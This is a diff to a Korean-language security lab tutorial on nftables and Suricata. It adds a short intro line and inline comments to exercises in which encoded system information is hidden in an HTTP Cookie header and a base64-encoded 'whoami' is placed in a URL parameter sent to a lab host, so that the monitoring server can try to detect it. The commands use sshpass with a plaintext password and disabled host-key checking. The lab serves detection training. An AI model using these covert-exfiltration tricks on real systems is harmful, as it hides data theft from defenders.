@@ -360,6 +360,8 @@ sudo nft list ruleset -a
 
 ### 실습 2: Suricata 규칙 확인
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # secu 서버에서 Suricata 규칙 파일 확인
 sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
@@ -425,11 +427,11 @@ echo "인코딩된 시스템 정보: $SYSINFO"
 # 정상처럼 보이는 HTTP 요청에 데이터 숨기기
 curl -s "http://10.20.30.80:3000/rest/products/search?q=test" \
   -H "Cookie: session=$SYSINFO" \
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"  # User-Agent 헤더
 
 # URL 파라미터에 인코딩된 명령 포함
 CMD=$(echo -n "whoami" | base64)
-curl -s "http://10.20.30.80:3000/rest/products/search?q=juice&ref=$CMD"
+curl -s "http://10.20.30.80:3000/rest/products/search?q=juice&ref=$CMD"  # silent 모드
 
 # secu에서 이 트래픽을 모니터링
 sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
